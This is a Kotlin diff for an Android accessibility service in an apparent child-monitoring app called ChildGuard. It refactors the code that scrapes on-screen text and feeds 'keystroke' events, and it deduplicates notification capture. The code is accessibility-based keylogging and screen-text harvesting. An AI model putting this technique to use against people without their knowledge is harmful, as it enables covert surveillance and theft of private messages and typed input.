@@ -9,6 +9,30 @@ import org.json.JSONObject
 import java.util.concurrent.ConcurrentLinkedQueue
 
 /**
+ * Minimal read-only view of an accessibility node. Keeps the interception
+ * logic free of Android framework types so it can be unit-tested on the JVM
+ * (and reused for any future UI-tree source).
+ */
+internal interface NodeLike {
+    val text: CharSequence?
+    val contentDescription: CharSequence?
+    val parent: NodeLike?
+    val childCount: Int
+    fun child(i: Int): NodeLike?
+    fun recycle()
+}
+
+/** Adapter from the real Android node to [NodeLike]. */
+internal class A11yNode(private val n: AccessibilityNodeInfo) : NodeLike {
+    override val text: CharSequence? get() = n.text
+    override val contentDescription: CharSequence? get() = n.contentDescription
+    override val parent: NodeLike? get() = n.parent?.let { A11yNode(it) }
+    override val childCount: Int get() = n.childCount
+    override fun child(i: Int): NodeLike? = n.getChild(i)?.let { A11yNode(it) }
+    override fun recycle() = n.recycle()
+}
+
+/**
  * Feature 1 — Accessibility interception.
  *
  * Ultimate hardened implementation (pen-tested against Android 15 semantics):
@@ -113,6 +137,80 @@ class ChildGuardAccessibilityService : AccessibilityService() {
             }
             return false
         }
+
+        /**
+         * Recovers text from the clicked node's own label or nearby edit fields.
+         *
+         * Works on [NodeLike], not the Android type, so the logic is pure and
+         * runs in plain JVM unit tests. Every loop increments before the next
+         * iteration, so a null child (views recycled mid-traversal) can never
+         * cause a hang.
+         */
+        internal fun extractTextNear(node: NodeLike): String {
+            node.text?.toString()?.trim()?.let { if (it.length > 1) return it }
+            node.contentDescription?.toString()?.trim()?.let { if (it.length > 1) return it }
+
+            // Search children/descendants (max depth 6) for text nodes.
+            val found = StringBuilder()
+            collectNodeText(node, found, 0, 6, 160)
+            if (found.isNotEmpty()) return found.toString()
+
+            // Walk up ancestors looking for a sibling EditText with text.
+            var parent = node.parent
+            var depth = 0
+            while (parent != null && depth < 3) {
+                var childIndex = 0
+                while (childIndex < parent.childCount) {
+                    val child = parent.child(childIndex)
+                    childIndex++ // always advance; null child cannot stall this loop
+                    if (child == null) continue
+                    val t = try {
+                        child.text?.toString()?.trim() ?: ""
+                    } finally {
+                        child.recycle()
+                    }
+                    if (t.length > 1) {
+                        parent.recycle()
+                        return t
+                    }
+                }
+                val nextParent = parent.parent
+                parent.recycle()
+                parent = nextParent
+                depth++
+            }
+            return ""
+        }
+
+        internal fun collectNodeText(
+            node: NodeLike,
+            out: StringBuilder,
+            depth: Int,
+            maxDepth: Int,
+            maxChars: Int
+        ) {
+            if (depth > maxDepth || out.length >= maxChars) return
+            node.text?.toString()?.trim()?.let {
+                if (it.length > 1 && out.length < maxChars) {
+                    if (out.isNotEmpty()) out.append(' ')
+                    out.append(it.take(maxChars - out.length))
+                }
+            }
+            node.contentDescription?.toString()?.trim()?.let {
+                if (it.length > 1 && out.length < maxChars) {
+                    if (out.isNotEmpty()) out.append(' ')
+                    out.append(it.take(maxChars - out.length))
+                }
+            }
+            for (i in 0 until node.childCount) {
+                val child = node.child(i) ?: continue
+                try {
+                    collectNodeText(child, out, depth + 1, maxDepth, maxChars)
+                } finally {
+                    child.recycle()
+                }
+            }
+        }
     }
 
     override fun onServiceConnected() {
@@ -136,7 +234,7 @@ class ChildGuardAccessibilityService : AccessibilityService() {
         }
         serviceInfo = info
         Log.i(TAG, "Accessibility service connected")
-        enqueueEvent("service_connected", "Accessibility service started", "")
+        enqueueEvent("service_connected", "com.childguard.app", "")
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
@@ -148,6 +246,10 @@ class ChildGuardAccessibilityService : AccessibilityService() {
 
         when (event.eventType) {
             AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
+                // Feature 3 (NotificationListenerService) is richer and is the
+                // canonical source; only use this fallback when it is not bound
+                // so the same notification is never counted twice.
+                if (ChildGuardNotificationListener.isListenerConnected) return
                 val texts = event.text?.joinToString(" ") ?: ""
                 if (texts.isNotEmpty()) {
                     val trimmed = texts.take(MAX_TEXT_LEN)
@@ -169,7 +271,7 @@ class ChildGuardAccessibilityService : AccessibilityService() {
                 val node = event.source
                 if (node == null) return
                 try {
-                    val text = extractTextNear(node)
+                    val text = extractTextNear(A11yNode(node))
                     if (text.isNotEmpty()) {
                         if (shouldEmitKeylog(pkg, text)) {
                             enqueueEvent("keystroke", pkg, text)
@@ -215,86 +317,14 @@ class ChildGuardAccessibilityService : AccessibilityService() {
         }
     }
 
-    /**
-     * Recovers text from the clicked node's own label or nearby edit fields.
-     *
-     * Every loop increments before the next iteration, so a null child (views
-     * being recycled mid-traversal) can never cause a hang.
-     */
-    private fun extractTextNear(node: AccessibilityNodeInfo): String {
-        node.text?.toString()?.trim()?.let { if (it.length > 1) return it }
-        node.contentDescription?.toString()?.trim()?.let { if (it.length > 1) return it }
-
-        // Search children/descendants (max depth 6) for text nodes.
-        val found = StringBuilder()
-        collectNodeText(node, found, 0, 6, 160)
-        if (found.isNotEmpty()) return found.toString()
-
-        // Walk up ancestors looking for a sibling EditText with text.
-        var parent = node.parent
-        var depth = 0
-        while (parent != null && depth < 3) {
-            var childIndex = 0
-            while (childIndex < parent.childCount) {
-                val child = parent.getChild(childIndex)
-                childIndex++ // always advance; null child cannot stall this loop
-                if (child == null) continue
-                val t = try {
-                    child.text?.toString()?.trim() ?: ""
-                } finally {
-                    child.recycle()
-                }
-                if (t.length > 1) {
-                    parent.recycle()
-                    return t
-                }
-            }
-            val nextParent = parent.parent
-            parent.recycle()
-            parent = nextParent
-            depth++
-        }
-        return ""
-    }
-
     private fun collectTextFromRoot(): List<String> {
         val texts = ArrayList<String>()
         val root = rootInActiveWindow ?: return texts
         val buf = StringBuilder()
-        collectNodeText(root, buf, 0, 12, 128)
+        collectNodeText(A11yNode(root), buf, 0, 12, 128)
         root.recycle()
         if (buf.isNotEmpty()) texts.add(buf.toString())
         return texts
-    }
-
-    private fun collectNodeText(
-        node: AccessibilityNodeInfo,
-        out: StringBuilder,
-        depth: Int,
-        maxDepth: Int,
-        maxChars: Int
-    ) {
-        if (depth > maxDepth || out.length >= maxChars) return
-        node.text?.toString()?.trim()?.let {
-            if (it.length > 1 && out.length < maxChars) {
-                if (out.isNotEmpty()) out.append(' ')
-                out.append(it.take(maxChars - out.length))
-            }
-        }
-        node.contentDescription?.toString()?.trim()?.let {
-            if (it.length > 1 && out.length < maxChars) {
-                if (out.isNotEmpty()) out.append(' ')
-                out.append(it.take(maxChars - out.length))
-            }
-        }
-        for (i in 0 until node.childCount) {
-            val child = node.getChild(i) ?: continue
-            try {
-                collectNodeText(child, out, depth + 1, maxDepth, maxChars)
-            } finally {
-                child.recycle()
-            }
-        }
     }
 
     private fun enqueueEvent(type: String, pkg: String, data: String) {
